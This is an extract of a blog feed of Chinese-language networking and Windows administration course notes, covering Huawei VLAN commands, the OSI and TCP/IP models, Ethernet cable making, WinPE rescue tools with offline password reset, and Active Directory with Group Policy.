title="配置VLAN的步骤"></a>配置VLAN的步骤</h3><p><strong>创建VLAN</strong></p><ul><li>创建单个VLAN</li><li>批量创建VLAN</li></ul><p><strong>将接口加入到相应的VLAN中</strong></p><h3 id="创建VLAN"><a href="#创建VLAN" class="headerlink" title="创建VLAN"></a>创建VLAN</h3><p><strong>创建单个VLAN</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[Huawei]vlan</span> <span class="string">10    //创建VLAN10</span></span><br></pre></td></tr></table></figure><p><strong>批量创建VLAN</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[Huawei]vlan</span> <span class="string">batch 10 15 20   //创建多个不连续vlan</span></span><br><span class="line"><span class="attr">[Huawei]vlan</span> <span class="string">batch 10 to 20   //创建多个连续vlan</span></span><br></pre></td></tr></table></figure><h3 id="删除VLAN"><a href="#删除VLAN" class="headerlink" title="删除VLAN"></a>删除VLAN</h3><p><strong>删除VLAN</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[Huawei]undo</span> <span class="string">vlan 10               //删除VLAN10</span></span><br><span class="line"><span class="attr">[Huawei]undo</span> <span class="string">vlan batch 10 15 20   //删除多个不连续vlan</span></span><br><span class="line"><span class="attr">[Huawei]undo</span> <span class="string">vlan batch 10 to 20   //删除多个连续vlan</span></span><br></pre></td></tr></table></figure><h3 id="Access接口"><a href="#Access接口" class="headerlink" title="Access接口"></a>Access接口</h3><p><strong>场景</strong></p><ul><li>通常用于连接终端设备（主机、服务器）</li></ul><p><strong>特点</strong></p><ul><li>同时只能属于一个VLAN</li><li>接收数据帧时，若该帧不带vlan标签，用接口PVID数值做为标签，给数据帧打标签</li><li>接收数据帧时，若该帧带vlan标签，判断vlan标签和本接口的PVID是否一致，一致接收数据，不一致则丢弃数据</li><li>转发数据帧时，若该帧vlan标签与本接口PVID一致，则剥离标签并转发，不一致则丢弃数据</li></ul><h3 id="将接口加入VLAN"><a href="#将接口加入VLAN" class="headerlink" title="将接口加入VLAN"></a>将接口加入VLAN</h3><p><strong>接口加入VLAN</strong></p><ul><li>创建VLAN</li><li>设置接口模式成Access</li><li>将接口加入VLAN</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[Huawei]interface</span> <span class="string">g0/0/1                 //进入g0/0/1接口</span></span><br><span class="line"><span class="attr">[Huawei-G0/0/1]port</span> <span class="string">link-type access     //将接口设置为access模式</span></span><br><span class="line"><span class="attr">[Huawei-G0/0/1]port</span> <span class="string">default vlan 2       //将接口加入vlan2</span></span><br></pre></td></tr></table></figure><h3 id="验证vlan的配置"><a href="#验证vlan的配置" class="headerlink" title="验证vlan的配置"></a>验证vlan的配置</h3><p><strong>检查vlan信息</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[Huawei]display</span> <span class="string">vlan               //显示所有vlan信息</span></span><br><span class="line"><span class="attr">[Huawei]display</span> <span class="string">vlan 2             //显示指定vlan信息</span></span><br><span class="line"><span class="attr">[Huawei]display</span> <span class="string">port vlan          //显示vlan中包含的接口信息</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全（更新ing） </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络通信原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全-网络通信原理1</title>
      <link href="/posts/netexp1.html"/>
      <url>/posts/netexp1.html</url>
      
        <content type="html"><![CDATA[<h1 id="网络通信原理"><a href="#网络通信原理" class="headerlink" title="网络通信原理"></a>网络通信原理</h1><h2 id="协议分层"><a href="#协议分层" class="headerlink" title="协议分层"></a>协议分层</h2><h3 id="计算机网络发展"><a href="#计算机网络发展" class="headerlink" title="计算机网络发展"></a>计算机网络发展</h3><p><strong>计算机的诞生</strong></p><ul><li>1946年2月14日ENIAC诞生</li></ul><p><strong>计算机网络的诞生</strong></p><ul><li>1969年APNET诞生</li></ul><p><strong>不同网络之间的互联</strong></p><ul><li>由于网络标准不一样，无法完成互联</li></ul><h3 id="计算机网络功能"><a href="#计算机网络功能" class="headerlink" title="计算机网络功能"></a>计算机网络功能</h3><p><strong>数据通信、资源共享、增加数据可靠性、提高系统处理能力（主要功能数据通信）</strong></p><p><img src="/../img/img_artical/net_sec/3.1.1.png" alt="3.1.1"></p><h3 id="什么是协议"><a href="#什么是协议" class="headerlink" title="什么是协议"></a>什么是协议</h3><p><strong>什么是协议?</strong></p><ul><li><p>为了使数据可以在网络上从源传递到目的地，网络上所有设备需要”讲”相同的”语言”</p></li><li><p>描述网络通信”语言”规范的一组规则就是协议</p></li><li><p>例如：两个人交谈，必须使用相同的语言，如果你说汉语，他说阿拉伯语……</p></li></ul><p><strong>数据通信协议的定义</strong></p><ul><li>决定数据的格式和传输的一组规则或者一组惯例</li></ul><h3 id="为什么分层"><a href="#为什么分层" class="headerlink" title="为什么分层"></a>为什么分层</h3><p><strong>网络通信的过程很复杂</strong></p><ul><li>数据以电子信号的形式穿越介质到达正确的计算机，然后转换成最初的形式，以便接收者能够阅读</li><li>为了降低网络设计的复杂性，将协议进行了分层设计，方便网络故障的定位</li></ul><h3 id="邮局实例（传统通信）"><a href="#邮局实例（传统通信）" class="headerlink" title="邮局实例（传统通信）"></a>邮局实例（传统通信）</h3><p><img src="/../img/img_artical/net_sec/3.1.2.png" alt="3.1.2"></p><h2 id="理解OSI模型"><a href="#理解OSI模型" class="headerlink" title="理解OSI模型"></a>理解OSI模型</h2><h3 id="OSI协议模型"><a href="#OSI协议模型" class="headerlink" title="OSI协议模型"></a>OSI协议模型</h3><p><img src="/../img/img_artical/net_sec/3.1.3.png" alt="3.1.3"></p><h3 id="OSI七层模型"><a href="#OSI七层模型" class="headerlink" title="OSI七层模型"></a>OSI七层模型</h3><p><strong>OSI参考模型</strong></p><ul><li>国际标准化组织(International Standard Organization，ISO)于1984年正式颁布开放系统互连 (Open System Interconnection，OSI) 参考模型</li><li>所有的软件和硬件开发都遵循统一的OSI模型</li></ul><p><img src="/../img/img_artical/net_sec/3.1.4.png" alt="3.1.4"></p><h3 id="OSI七层的功能简介"><a href="#OSI七层的功能简介" class="headerlink" title="OSI七层的功能简介"></a>OSI七层的功能简介</h3><table><thead><tr><th align="center">层名称</th><th align="center">功能</th></tr></thead><tbody><tr><td align="center">应用层</td><td align="center">为用户提供各种服务功能，比如各种应用程序，网络服务与最终用户的一个接口</td></tr><tr><td align="center">表示层</td><td align="center">数据的表示、安全、压缩、加密等</td></tr><tr><td align="center">会话层</td><td align="center">建立、维护、终止会话，例如断点续传</td></tr><tr><td align="center">传输层</td><td align="center">定义传输数据的协议端口号，实现了程序与程序的互连，可靠与不可靠的传输,流量控制差错校验</td></tr><tr><td align="center">网络层</td><td align="center">进行逻辑地址寻址，实现不同网络之间通信，定义了IP地址，为数据的传输选择最佳路径，路由器工作在网络层</td></tr><tr><td align="center">数据链路层</td><td align="center">建立逻辑链接，进行硬件地址寻址、通过MAC地址实现数据的通信，帧包装、帧传输、帧同步，交换机工作在数据链路层</td></tr><tr><td align="center">物理层</td><td align="center">建立、维护、断开物理连接，定义了接口及介质，实现了比特流的传输</td></tr></tbody></table><h2 id="理解TCP-IP模型"><a href="#理解TCP-IP模型" class="headerlink" title="理解TCP&#x2F;IP模型"></a>理解TCP&#x2F;IP模型</h2><h3 id="OSI模型与TCP-IP模型"><a href="#OSI模型与TCP-IP模型" class="headerlink" title="OSI模型与TCP&#x2F;IP模型"></a>OSI模型与TCP&#x2F;IP模型</h3><ul><li>OSI模型，仅仅是ISO 提出的一个”参考”标准</li><li>实际的网络中更多使用TCP&#x2F;IP 5层模型，但是实现的功能是相同的</li></ul><p><img src="/../img/img_artical/net_sec/3.1.5.png" alt="3.1.5"></p><h3 id="TCP-IP协议族的组成"><a href="#TCP-IP协议族的组成" class="headerlink" title="TCP&#x2F;IP协议族的组成"></a>TCP&#x2F;IP协议族的组成</h3><p><strong>TCP&#x2F;IP是一系列协议的集合，所以严格称呼应是TCP&#x2F;IP协议族</strong></p><p><img src="/../img/img_artical/net_sec/3.1.6.png" alt="3.1.6"></p><p><strong>网络层常见协议：</strong> </p><ul><li><p>IP：互联网协议，定义了IP地址</p></li><li><p>ICMP：网络控制消息协议，验证和测试网络连通性</p></li><li><p>ARP：地址解析协议，将IP地址解析成MAC地址</p></li><li><p>OSPF：开放式最短路径优先，动态路由协议</p></li></ul><p><strong>传输层常见协议：</strong></p><ul><li><p>TCP：传输控制协议—安全可靠，速度慢</p></li><li><p>UDP： 用户数据报协议—不可靠，速度快</p></li></ul><p><strong>应用层常见协议：</strong></p><ul><li><p>HTTP：超文本传输协议—TCP 80端口</p></li><li><p>FTP：文件传输协议—TCP 20  和21</p></li><li><p>TFTP：简单文件传输协议—UDP  69</p></li><li><p>DHCP：动态主机配置协议—UDP 67  68</p></li><li><p>Telnet：远程管理协议—TCP 23</p></li><li><p>RDP：远程桌面协议—TCP 3389</p></li><li><p>DNS：域名解析—TCP或UDP 53</p></li><li><p>SMTP：简单邮件传输协议—TCP 25</p></li><li><p>SNMP：网络管理协议—UDP 161</p></li></ul><h3 id="各层PDU"><a href="#各层PDU" class="headerlink" title="各层PDU"></a>各层PDU</h3><p><strong>PDU：Protocol Data Unit，协议数据单元，即协议的数据包</strong></p><p><img src="/../img/img_artical/net_sec/3.1.7.png" alt="3.1.7"></p><ul><li><p>传输层 数据段 segment</p></li><li><p>网络层 数据包 packet</p></li><li><p>数据链路层 数据帧 frame</p></li><li><p>物理层  比特流 bit</p></li></ul><h3 id="设备与层的对应关系"><a href="#设备与层的对应关系" class="headerlink" title="设备与层的对应关系"></a>设备与层的对应关系</h3><p><img src="/../img/img_artical/net_sec/3.1.8.png" alt="3.1.8"></p><h2 id="数据通信流程"><a href="#数据通信流程" class="headerlink" title="数据通信流程"></a>数据通信流程</h2><h3 id="数据通信"><a href="#数据通信" class="headerlink" title="数据通信"></a>数据通信</h3><p><strong>所谓的设备之间的通信，指的是设备之间能够互相传输数据</strong></p><p><strong>产生数据</strong></p><ul><li>即数据封装，指的是数据通过应用层产生以后，发送到第一层，每经过一层都添加一个协议头部的过程</li></ul><p><strong>传输数据</strong></p><ul><li>即网络传输，数据在由不同的网络设备组成的互联网中传输的过程，主要是依靠交换机和路由器实现数据在不同设备之间的转发</li></ul><p><strong>接收数据</strong></p><ul><li>即数据解封装，指的是数据被设备通过网线接收以后形成数据帧，然后一层一层分析头部，然后传递给上一层处理，一直到应用层的过程</li><li>也可以说是：不断的分析并删除每层的协议头部的过程</li></ul><p><strong>设备之间的数据传输，一定是双向的，每个方向都分为3个阶段</strong></p><ul><li>产生数据，也称之为”数据封装”</li><li>传输数据，也称之为”网络传输”</li><li>接收数据，也称之为”数据解封装”</li></ul><h3 id="数据封装过程"><a href="#数据封装过程" class="headerlink" title="数据封装过程"></a>数据封装过程</h3><p><strong>应用层在产生数据后，从应用层到物理层，每经过一层，都会加上每一层的头部信息，传输层封装TCP头部， 网络层封装IP头部，数据链路层封装MAC头部和尾部</strong></p><p><img src="/../img/img_artical/net_sec/3.1.9.png" alt="3.1.9"></p><h3 id="数据解封装过程"><a href="#数据解封装过程" class="headerlink" title="数据解封装过程"></a>数据解封装过程</h3><p><strong>数据从下往上的过程，接收数据后，从物理层到应用层，每达到一层，会把相应的头部信息拆除，数据链路层拆除MAC头部和尾部，网络层拆除IP头部，传输层拆除TCP头部</strong></p><p><img src="/../img/img_artical/net_sec/3.1.10.png" alt="3.1.10"></p><h2 id="物理层解析"><a href="#物理层解析" class="headerlink" title="物理层解析"></a>物理层解析</h2><h3 id="物理层概述"><a href="#物理层概述" class="headerlink" title="物理层概述"></a>物理层概述</h3><p><strong>物理层是TCP&#x2F;IP模型的最底层</strong></p><p><strong>物理层为数据传输提供稳定的物理连接</strong></p><h3 id="物理层功能"><a href="#物理层功能" class="headerlink" title="物理层功能"></a>物理层功能</h3><ul><li>定义设备的物理连接的标准和特性，比如接口形状，大小</li><li>定义电气特性，高低电压、传输速率和传输距离</li><li>构建数据通道，通过物理接口和传输介质来进行数据传输</li><li>物理层核心就是“信号和介质“</li></ul><h3 id="物理层传输介质"><a href="#物理层传输介质" class="headerlink" title="物理层传输介质"></a>物理层传输介质</h3><p><strong>有线介质</strong></p><ul><li>双绞线</li><li>光纤</li></ul><p><strong>无线介质</strong></p><ul><li>微波</li><li>激光</li><li>红外线</li></ul><p><strong>超五类线缆</strong></p><ul><li>局域网环境，最常见线缆</li><li>线缆外表有清晰“米标”</li><li>适用于100Mbps网络</li></ul><p><strong>6类线缆</strong></p><ul><li>增加十字骨架，抗干扰</li><li>适用于1000Mbps网络</li></ul><p><strong>7类和8类线缆</strong></p><ul><li>7类速率10Gbps</li><li>8类速率40Gbps</li></ul><p><strong>水晶头</strong></p><p><img src="/../img/img_artical/net_sec/3.1.11.png" alt="3.1.11"></p><p><strong>布线套装</strong></p><p><img src="/../img/img_artical/net_sec/3.1.12.png" alt="3.1.12"></p><p><strong>光纤</strong></p><ul><li>光纤按光在其中的传输模式可分为单模和多模</li></ul><p><strong>单模光纤</strong></p><ul><li>可支持1G~40Gb&#x2F;100Gb，距离200KM</li><li>适合用于长距离传输、可用于室内和室外</li></ul><p><strong>多模光纤</strong></p><ul><li>可支持1G~40Gb&#x2F;100Gb高速网络</li><li>适合用于短距离传输，通常用于室内</li></ul><p><strong>布线套装</strong></p><p><img src="/../img/img_artical/net_sec/3.1.13.png" alt="3.1.13"></p><h2 id="网线制作"><a href="#网线制作" class="headerlink" title="网线制作"></a>网线制作</h2><h3 id="制作双绞线"><a href="#制作双绞线" class="headerlink" title="制作双绞线"></a>制作双绞线</h3><p><strong>剥线</strong></p><ul><li>将双绞线的一端插入网线的剥线口 (末端离刀口长度约3-5厘米)，握住网线缓慢旋转一圈，去掉外部的套层，可看到相互缠绕的8根芯线</li><li>注意:不要割断金属芯线</li></ul><p><strong>理线</strong></p><ul><li>将裸露的8根双绞线分开，按照标准线序捋直排列好，并用网线钳将末端剪齐，保留1.2厘米左右</li></ul><p><img src="/../img/img_artical/net_sec/3.1.14.png" alt="3.1.14"></p><p><strong>排列好的每条芯线分别对应RJ-45水晶头的1-8针脚</strong></p><ul><li>T568B(白橙、橙、白绿、蓝、白蓝、绿、白棕、棕)</li><li>T568A(白绿、绿、白橙、蓝、白蓝、橙、白棕、棕)</li></ul><p><img src="/../img/img_artical/net_sec/3.1.15.png" alt="3.1.15"></p><p><strong>压线头</strong></p><ul><li>将整理好的双绞线芯线平稳捏住 (末端保持整齐)，插入到RJ-45水晶接头中(塑料卡扣朝下，开口朝向网线)确保8根芯线都顶到最里端的铜触片位置</li></ul><p><img src="/../img/img_artical/net_sec/3.1.16.png" alt="3.1.16"></p><p><strong>压线</strong></p><ul><li>将接好线的水晶头放到网线钳的压线口内 (注意要捏住网线，往里顶紧)，然后握住网线钳使劲压紧(线与线头不能有松动)，以确保水晶头的铜触片嵌入双绞线的芯线</li></ul><p><img src="/../img/img_artical/net_sec/3.1.17.png" alt="3.1.17"></p><p><strong>制作双绞线的另一端</strong></p><ul><li>依次剥线、理线、压线头，操作与前面一样</li><li>两端都压制好以后，一根网线就制作完工</li></ul><h3 id="测试双绞线"><a href="#测试双绞线" class="headerlink" title="测试双绞线"></a>测试双绞线</h3><p><strong>测试双绞线的连通性</strong></p><ul><li>将做好的双绞线两端分别插入测试仪的RJ-45接口，打开测试仪的电源开关，观察指示灯以判断网线连通性</li></ul><p><img src="/../img/img_artical/net_sec/3.1.18.png" alt="3.1.18"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全（更新ing） </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络通信原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全-Windows系统安全6</title>
      <link href="/posts/winsec6.html"/>
      <url>/posts/winsec6.html</url>
      
        <content type="html"><![CDATA[<h1 id="Window系统安全"><a href="#Window系统安全" class="headerlink" title="Window系统安全"></a>Window系统安全</h1><h2 id="PE急救工具盘"><a href="#PE急救工具盘" class="headerlink" title="PE急救工具盘"></a>PE急救工具盘</h2><h3 id="什么是PE工具箱"><a href="#什么是PE工具箱" class="headerlink" title="什么是PE工具箱"></a>什么是PE工具箱</h3><p><strong>基于WindowsPE制作，包含大量工具软件的U盘&#x2F;光盘系统</strong></p><ul><li>磁盘分区、分区调整、分区格式化</li><li>系统安装、系统备份和还原</li><li>修改密码、数据恢复</li></ul><p><strong>注: 网上的PE工具箱大同小异，以微PE为例</strong></p><h3 id="制作WinPE工具箱"><a href="#制作WinPE工具箱" class="headerlink" title="制作WinPE工具箱"></a>制作WinPE工具箱</h3><p><strong>制作</strong></p><ul><li>安装PE到U盘</li><li>安装PE到移动硬盘</li><li>生成可启动ISO</li></ul><p><img src="/../img/img_artical/net_sec/2.6.1.png" alt="2.6.1"></p><h2 id="重置Win密码"><a href="#重置Win密码" class="headerlink" title="重置Win密码"></a>重置Win密码</h2><h3 id="清除Windows登录密码"><a href="#清除Windows登录密码" class="headerlink" title="清除Windows登录密码"></a>清除Windows登录密码</h3><p><strong>如果忘记Windows开机密码</strong></p><ul><li>win7&#x2F;8&#x2F;10&#x2F;2012&#x2F;2016&#x2F;2019等全系列</li></ul><p><strong>原理</strong></p><ul><li>PE启动，修改密码文件C: Windows System32 config SAM</li></ul><p><strong>操作</strong></p><ul><li>NTPWEdit</li><li>清空密码&#x2F;设置新密码</li></ul><p><img src="/../img/img_artical/net_sec/2.6.2.png" alt="2.6.2"></p><h2 id="磁盘分区"><a href="#磁盘分区" class="headerlink" title="磁盘分区"></a>磁盘分区</h2><h3 id="分区大小调整"><a href="#分区大小调整" class="headerlink" title="分区大小调整"></a>分区大小调整</h3><p><strong>Win磁盘管理的压缩卷、扩展卷只能对“右侧”操作</strong></p><ul><li>压缩只能“释放”到右侧</li><li>基本磁盘扩展只能“合并”右侧空间</li></ul><p><strong>傲梅分区助手、DiskGenius</strong></p><ul><li>快速分区</li><li>自由调整分区大小</li></ul><p><img src="/../img/img_artical/net_sec/2.6.3.png" alt="2.6.3"></p><h2 id="系统备份与恢复"><a href="#系统备份与恢复" class="headerlink" title="系统备份与恢复"></a>系统备份与恢复</h2><h3 id="系统备份"><a href="#系统备份" class="headerlink" title="系统备份"></a>系统备份</h3><p><strong>WIM是英文Microsoft Windowslmaging Format(WIM)的简称，它是Windows基于文件的映像格式</strong></p><ul><li>一个文件中可以存储多个映像</li><li>可以离线维护映像</li><li>支持压缩</li></ul><p><strong>CGI备份还原工具</strong></p><ul><li>创建WIM备份</li></ul><p><img src="/../img/img_artical/net_sec/2.6.4.png" alt="2.6.4"></p><h3 id="系统恢复"><a href="#系统恢复" class="headerlink" title="系统恢复"></a>系统恢复</h3><p><strong>从WIM文件恢复</strong></p><p><img src="/../img/img_artical/net_sec/2.6.5.png" alt="2.6.5"></p><h2 id="制作U启动盘"><a href="#制作U启动盘" class="headerlink" title="制作U启动盘"></a>制作U启动盘</h2><h3 id="U启动程序"><a href="#U启动程序" class="headerlink" title="U启动程序"></a>U启动程序</h3><p><strong>下载制作U启程序</strong></p><ul><li>Ventov是一个制作可启动U盘的开源工具，只需要把ISO等类型的文件拷贝到U盘里面就可以启动了</li><li>同时支持x86LegacyBIOS、x86_64UEFI模式</li><li>支持Windows、Linux等操作系统</li></ul><h3 id="运行U启程序"><a href="#运行U启程序" class="headerlink" title="运行U启程序"></a>运行U启程序</h3><p><strong>制作U盘启动盘</strong></p><ul><li>确认电脑已插上U盘后，并且事先备份U盘数据内容</li><li>双击“Ventoy2Disk”运行</li></ul><h3 id="准备ISO镜像文件"><a href="#准备ISO镜像文件" class="headerlink" title="准备ISO镜像文件"></a>准备ISO镜像文件</h3><p><strong>复制操作系统ISO镜像文件到U盘</strong></p><p><img src="/../img/img_artical/net_sec/2.6.6.png" alt="2.6.6"></p><h3 id="引导方式"><a href="#引导方式" class="headerlink" title="引导方式"></a>引导方式</h3><p><strong>引导方式</strong></p><ul><li>BIOS，基本输入输出系统，Windows7及以前操作系统</li><li>UEFI，统一的可扩展固件接口，Windows8及以后操作系统</li></ul><p><strong>设置的方法</strong></p><ul><li>开机后根据提示操作，通常为 Del键或F2键</li></ul><h3 id="物理机进入“引导菜单”"><a href="#物理机进入“引导菜单”" class="headerlink" title="物理机进入“引导菜单”"></a>物理机进入“引导菜单”</h3><p><strong>插入U盘</strong></p><p><strong>进入”引导菜单”</strong></p><ul><li>根据提示按F12键进入</li><li>注:不同电脑按键可能不一样</li></ul><h3 id="物理机U盘启动计算机"><a href="#物理机U盘启动计算机" class="headerlink" title="物理机U盘启动计算机"></a>物理机U盘启动计算机</h3><p><strong>选择U盘引导</strong></p><ul><li>可以根据U盘的型号或容量判断</li></ul><p><strong>在Ventoy界面选中Windows 10ISO镜像</strong></p><p><img src="/../img/img_artical/net_sec/2.6.7.png" alt="2.6.7"></p><p><strong>出现”Pressany key to boot…”时，按回车或空格键</strong></p><p><strong>进入安装界面</strong></p><p><img src="/../img/img_artical/net_sec/2.6.8.png" alt="2.6.8"></p><h2 id="U启安装Win10系统"><a href="#U启安装Win10系统" class="headerlink" title="U启安装Win10系统"></a>U启安装Win10系统</h2><h3 id="虚拟机进入“引导菜单”"><a href="#虚拟机进入“引导菜单”" class="headerlink" title="虚拟机进入“引导菜单”"></a>虚拟机进入“引导菜单”</h3><p><strong>打开Windows10虚拟机</strong></p><p><strong>插入U盘</strong></p><p><img src="/../img/img_artical/net_sec/2.6.9.png" alt="2.6.9"></p><h3 id="虚拟机U盘启动计算机"><a href="#虚拟机U盘启动计算机" class="headerlink" title="虚拟机U盘启动计算机"></a>虚拟机U盘启动计算机</h3><p><strong>重新启动虚拟机，进入引导菜单</strong></p><ul><li>按Ctrl+Alt+Insert键重启</li><li>重启后，不停按ESC键</li></ul><p><strong>注:不要””关机再开机”的方式启动</strong></p><p><img src="/../img/img_artical/net_sec/2.6.10.png" alt="2.6.10"></p><p><strong>在Ventoy界面选中Windows 10ISO镜像</strong></p><p><img src="/../img/img_artical/net_sec/2.6.11.png" alt="2.6.11"></p><p><strong>进入安装界面</strong></p><p><img src="/../img/img_artical/net_sec/2.6.12.png" alt="2.6.12"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全（更新ing） </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows系统安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全-Windows系统安全5</title>
      <link href="/posts/winsec5.html"/>
      <url>/posts/winsec5.html</url>
      
        <content type="html"><![CDATA[<h1 id="Window系统安全"><a href="#Window系统安全" class="headerlink" title="Window系统安全"></a>Window系统安全</h1><h2 id="活动目录与域概述"><a href="#活动目录与域概述" class="headerlink" title="活动目录与域概述"></a>活动目录与域概述</h2><h3 id="域和域控制器"><a href="#域和域控制器" class="headerlink" title="域和域控制器"></a>域和域控制器</h3><p><strong>工作组</strong></p><ul><li>特点：地位平等、管理分散，没有实现集中管理</li><li>默认工作组名：WORKGROUP</li><li>工作组环境下创建的用户称为本地用户，本地用户是本地创建、本地存储、本地登录且只能登录本地一台计算机</li></ul><p><strong>域（Domain）</strong></p><ul><li>集中管理网络中多台计算机的一种逻辑模式</li><li>有别于工作组的对等式管理</li><li>是组织与存储资源的核心管理单元</li></ul><p><strong>域控制器（Domain Controller）</strong></p><ul><li>每个域中至少有一台域控制器</li><li>集中存放整个域的用户账号和安全数据库</li></ul><h3 id="活动目录的概念"><a href="#活动目录的概念" class="headerlink" title="活动目录的概念"></a>活动目录的概念</h3><p><strong>活动目录（Active Directory）</strong></p><ul><li>Windows网络中的目录服务</li><li>提供了存储网络对象信息并使网络用户使用这些数据的方法</li></ul><p><strong>活动目录特点</strong></p><ul><li>集中管理、便捷的网络资源（用户&#x2F;组账号、共享文件夹、打印机）访问</li><li>可扩展性</li></ul><h2 id="创建AD域网络"><a href="#创建AD域网络" class="headerlink" title="创建AD域网络"></a>创建AD域网络</h2><h3 id="升级域控的条件"><a href="#升级域控的条件" class="headerlink" title="升级域控的条件"></a>升级域控的条件</h3><ul><li>安装者必须具有本地管理员权限</li><li>操作系统版本必须为Windows Server版</li><li>本地磁盘至少有一个分区为NTFS文件系统</li><li>静态TCP&#x2F;IP设置（IP地址、子网掩码等）</li><li>有相应的DNS服务器支持</li><li>有足够的可用磁盘空间</li></ul><h3 id="安装第一台域控制器"><a href="#安装第一台域控制器" class="headerlink" title="安装第一台域控制器"></a>安装第一台域控制器</h3><p><strong>推荐步骤</strong></p><ul><li>设置网络环境和主机名</li><li>Active Directory域服务</li><li>提升为域控制器</li><li>在新林中新建域</li><li>林功能级别</li><li>设置目录服务还原模式的Administrator密码</li><li>安装</li></ul><h3 id="设置网络参数和主机名"><a href="#设置网络参数和主机名" class="headerlink" title="设置网络参数和主机名"></a>设置网络参数和主机名</h3><p><strong>配置域控制器网络环境</strong></p><p><img src="/../img/img_artical/net_sec/2.5.1.png" alt="2.5.1"></p><h3 id="添加活动目录"><a href="#添加活动目录" class="headerlink" title="添加活动目录"></a>添加活动目录</h3><p><strong>添加Active Directory域服务</strong></p><p><img src="/../img/img_artical/net_sec/2.5.2.png" alt="2.5.2"></p><h3 id="活动目录安装向导"><a href="#活动目录安装向导" class="headerlink" title="活动目录安装向导"></a>活动目录安装向导</h3><p><strong>添加新林、输入域名</strong></p><p><img src="/../img/img_artical/net_sec/2.5.3.png" alt="2.5.3"></p><p><strong>林级别及目录服务还原密码</strong></p><p><img src="/../img/img_artical/net_sec/2.5.4.png" alt="2.5.4"></p><p><strong>安装</strong></p><p><img src="/../img/img_artical/net_sec/2.5.5.png" alt="2.5.5"></p><h2 id="加入域网络"><a href="#加入域网络" class="headerlink" title="加入域网络"></a>加入域网络</h2><h3 id="客户计算机加入域"><a href="#客户计算机加入域" class="headerlink" title="客户计算机加入域"></a>客户计算机加入域</h3><p><strong>配置客户端网络环境</strong></p><p><img src="/../img/img_artical/net_sec/2.5.6.png" alt="2.5.6"></p><p><strong>设置 “计算机名&#x2F;域更改”</strong></p><p><img src="/../img/img_artical/net_sec/2.5.7.png" alt="2.5.7"></p><p><strong>输入域用户账户名</strong></p><p><img src="/../img/img_artical/net_sec/2.5.8.png" alt="2.5.8"></p><p><strong>确认域成员身份</strong></p><p><img src="/../img/img_artical/net_sec/2.5.9.png" alt="2.5.9"></p><h2 id="域用户管理"><a href="#域用户管理" class="headerlink" title="域用户管理"></a>域用户管理</h2><h3 id="创建域用户账户"><a href="#创建域用户账户" class="headerlink" title="创建域用户账户"></a>创建域用户账户</h3><p><strong>域用户账户存储在活动目录数据库中</strong></p><p><strong>创建域用户的工具</strong></p><p><img src="/../img/img_artical/net_sec/2.5.10.png" alt="2.5.10"></p><p><strong>显示名</strong></p><ul><li>在同一组织单位（OU）内应唯一</li></ul><p><strong>用户登录名</strong></p><ul><li>在整个域唯一</li><li>最长20字符</li></ul><h3 id="配置域用户账户属性"><a href="#配置域用户账户属性" class="headerlink" title="配置域用户账户属性"></a>配置域用户账户属性</h3><ul><li>登录时间</li><li>登录到</li><li>账户过期</li></ul><p><img src="/../img/img_artical/net_sec/2.5.11.png" alt="2.5.11"></p><p><strong>登录时间</strong></p><ul><li>默认任意时间都能登录</li></ul><p><strong>登录到</strong></p><ul><li>可限制登录的计算机</li></ul><p><img src="/../img/img_artical/net_sec/2.5.12.png" alt="2.5.12"></p><h2 id="OU与组策略"><a href="#OU与组策略" class="headerlink" title="OU与组策略"></a>OU与组策略</h2><h3 id="组织单元（OU）"><a href="#组织单元（OU）" class="headerlink" title="组织单元（OU）"></a>组织单元（OU）</h3><p><strong>概念</strong></p><ul><li>容器：有效地组织活动目录对象</li></ul><p><strong>设计方式</strong></p><ul><li>基于部门的OU</li><li>基于地理位置的OU</li><li>基于对象类型的OU</li><li>OU的设计也可以是混合的</li></ul><h3 id="组策略的作用"><a href="#组策略的作用" class="headerlink" title="组策略的作用"></a>组策略的作用</h3><p><strong>组策略（一组策略的集合）</strong></p><ul><li>可以统一修改系统、设置程序</li><li>调整桌面环境、安全设置、自动执行脚本、软件分发</li></ul><p><strong>使用组策略可以：</strong></p><ul><li>对整个域设置组策略，可影响所有成员计算机和域用户的工作环境</li><li>对OU设置组策略，可影响该OU下的所有计算机和域用户的工作环境</li><li>降低布置用户和计算机环境的总费用，方便推行公司计算机使用规范及安全策略</li></ul><h3 id="组策略设置对象"><a href="#组策略设置对象" class="headerlink" title="组策略设置对象"></a>组策略设置对象</h3><p><strong>组策略的具体设置保存在GPO中</strong></p><p><strong>默认的2个GPO</strong></p><ul><li>默认域策略（Default Domain Policy）</li><li>默认域控制器策略（Default Domain Controller Policy）</li></ul><h3 id="计算机配置与用户配置"><a href="#计算机配置与用户配置" class="headerlink" title="计算机配置与用户配置"></a>计算机配置与用户配置</h3><p><img src="/../img/img_artical/net_sec/2.5.13.png" alt="2.5.13"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全（更新ing） </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows系统安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全-Windows系统安全4</title>
      <link href="/posts/winsec4.html"/>
      <url>/posts/winsec4.html</url>
      
